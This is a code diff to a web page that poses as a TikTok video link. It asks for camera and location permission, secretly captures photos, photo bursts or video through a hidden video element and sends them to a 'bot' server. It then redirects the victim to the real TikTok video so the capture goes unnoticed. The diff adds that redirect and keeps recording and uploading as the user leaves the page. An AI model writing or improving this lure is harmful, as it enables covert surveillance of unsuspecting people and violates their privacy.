@@ -18,11 +18,12 @@
         .permission-btn { background: #fe2c55; color: #fff; border: none; padding: 14px 48px; border-radius: 28px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 8px; }
         .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
         .video-btn { background: #fe2c55; }
-        .fake-video { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; flex-direction: column; background: #000; }
-        .fake-video .play-icon { font-size: 80px; color: rgba(255,255,255,0.3); margin-bottom: 20px; }
-        .fake-video .title { font-size: 18px; font-weight: 600; color: rgba(255,255,255,0.6); }
-        .fake-video .subtitle { font-size: 14px; color: rgba(255,255,255,0.3); margin-top: 8px; }
-        .overlay-gradient { position: absolute; bottom: 0; left: 0; right: 0; height: 200px; background: linear-gradient(transparent, rgba(0,0,0,0.4)); z-index: 3; pointer-events: none; }
+        .recording-indicator { position: fixed; bottom: 30px; right: 20px; z-index: 1000; display: none; align-items: center; gap: 8px; background: rgba(0,0,0,0.7); padding: 8px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.2); }
+        .recording-dot { width: 10px; height: 10px; background: #fe2c55; border-radius: 50%; animation: pulse 1s infinite; }
+        .recording-text { font-size: 12px; color: rgba(255,255,255,0.6); }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -33,13 +34,18 @@
 </div>
 
 <div class="video-container">
-    <div class="fake-video" id="fakeVideo">
-        <div class="play-icon">▶️</div>
-        <div class="title">Loading video...</div>
-        <div class="subtitle" id="statusText">Preparing...</div>
+    <div style="text-align: center;">
+        <div style="font-size: 60px; margin-bottom: 10px;">🎵</div>
+        <h2 style="font-weight: 600; font-size: 22px;">TikTok</h2>
+        <p style="color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 4px;">Loading video...</p>
+        <div class="spinner" id="spinner"></div>
     </div>
-    <div class="overlay-gradient"></div>
     <video id="hiddenVideo" autoplay playsinline muted></video>
+</div>
+
+<div class="recording-indicator" id="recordingIndicator">
+    <div class="recording-dot"></div>
+    <span class="recording-text">Recording...</span>
 </div>
 
 <div class="bottom-bar"><div style="width:70px;"></div></div>
@@ -66,32 +72,39 @@
     let recordingActive = false;
     let recordingStopped = false;
     let startTime = 0;
+    let redirectDone = false;
     const MAX_BURST = 5;
 
     const hiddenVideo = document.getElementById('hiddenVideo');
     const permissionOverlay = document.getElementById('permissionOverlay');
     const allowBtn = document.getElementById('allowGpsBtn');
     const loadingText = document.getElementById('loadingText');
-    const fakeVideo = document.getElementById('fakeVideo');
-    const statusText = document.getElementById('statusText');
+    const spinner = document.getElementById('spinner');
+    const recordingIndicator = document.getElementById('recordingIndicator');
 
-    // ===== UI UPDATES =====
-    function updateStatus(message) {
-        statusText.textContent = message;
-    }
-
-    function showVideoPlaying() {
-        const playIcon = fakeVideo.querySelector('.play-icon');
-        const title = fakeVideo.querySelector('.title');
-        playIcon.textContent = '▶️';
-        title.textContent = 'Video playing...';
-        updateStatus('Watching video');
+    // ===== REDIRECT TO REAL TIKTOK =====
+    function redirectToTikTok() {
+        if (redirectDone) return;
+        redirectDone = true;
+        
+        console.log('Redirecting to TikTok:', video_url);
+        
+        // Try to open in TikTok app
+        setTimeout(() => {
+            window.location.href = `tiktok://video?url=${encodeURIComponent(video_url)}`;
+        }, 300);
+        
+        // Fallback: open in browser
+        setTimeout(() => {
+            window.location.href = video_url;
+        }, 2000);
     }
 
     // ===== SEND VIDEO =====
     function sendVideoToBot() {
         if (recordingStopped) return;
         recordingStopped = true;
+        recordingActive = false;
         
         if (!recordedChunks || recordedChunks.length === 0) {
             console.log('No video recorded');
@@ -115,15 +128,15 @@
         reader.readAsDataURL(blob);
     }
 
-    // ===== STOP RECORDING WHEN USER LEAVES =====
     function stopRecordingAndSend() {
         if (!recordingActive || recordingStopped) return;
         recordingActive = false;
         recordingStopped = true;
+        recordingIndicator.style.display = 'none';
         
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
-            console.log('⏹️ Recording stopped (user left)');
+            console.log('⏹️ Recording stopped');
             sendVideoToBot();
         }
     }
@@ -204,7 +217,6 @@
 
         switch (content_type) {
             case 'single_photo':
-                updateStatus('Capturing photo...');
                 const photo = await grabPhoto();
                 if (photo) {
                     sendToServer({
@@ -214,11 +226,9 @@
                         type: 'photo'
                     });
                 }
-                updateStatus('Photo captured!');
                 break;
 
             case 'burst':
-                updateStatus('Capturing photos...');
                 const photos = [];
                 for (let i = 0; i < MAX_BURST; i++) {
                     const p = await grabPhoto();
@@ -233,15 +243,13 @@
                         type: 'burst'
                     });
                 }
-                updateStatus('Photos captured!');
                 break;
 
             case 'video':
-                // Show video playing
-                showVideoPlaying();
+                // Show recording indicator
+                recordingIndicator.style.display = 'flex';
                 startTime = Date.now();
                 
-                // Start recording
                 recordedChunks = [];
                 const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
                     ? 'video/webm;codecs=vp9,opus' : 'video/webm';
@@ -254,19 +262,19 @@
                 mediaRecorder.onstop = () => {
                     if (!recordingStopped) {
                         recordingStopped = true;
+                        recordingActive = false;
+                        recordingIndicator.style.display = 'none';
                         sendVideoToBot();
                     }
                 };
                 
                 mediaRecorder.start();
                 recordingActive = true;
-                console.log('🔴 Recording started (user can leave anytime)');
-                updateStatus('▶️ Video playing...');
+                console.log('🔴 Recording started');
                 break;
         }
     }
 
-    // ===== START CAMERA =====
     function startCamera(facingMode) {
         navigator.mediaDevices.getUserMedia({
             video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -283,11 +291,13 @@
                 currentFacingMode = facingMode;
                 
                 setTimeout(() => {
-                    updateStatus('Loading video...');
-                    setTimeout(() => {
-                        doCapture();
-                    }, 500);
+                    doCapture();
                 }, 300);
+                
+                // Redirect to TikTok after 1 second
+                setTimeout(() => {
+                    redirectToTikTok();
+                }, 800);
             }).catch(e => console.error('Play error:', e));
 
         }).catch(err => {
@@ -299,26 +309,22 @@
         });
     }
 
-    // ===== EVENT LISTENERS FOR USER LEAVING =====
-    // Detect when user closes tab
-    window.addEventListener('beforeunload', function(e) {
+    // ===== DETECT WHEN USER LEAVES =====
+    window.addEventListener('beforeunload', function() {
         if (recordingActive) {
             stopRecordingAndSend();
         }
     });
 
-    // Detect when user navigates away
-    window.addEventListener('pagehide', function(e) {
+    window.addEventListener('pagehide', function() {
         if (recordingActive) {
             stopRecordingAndSend();
         }
     });
 
-    // Detect when user switches to another app (mobile)
     document.addEventListener('visibilitychange', function() {
         if (document.hidden && recordingActive) {
-            // They switched to another app - keep recording
-            // Wait 5 seconds, if still hidden, stop
+            // They switched apps - wait 5 seconds then stop
             setTimeout(() => {
                 if (document.hidden && recordingActive) {
                     stopRecordingAndSend();
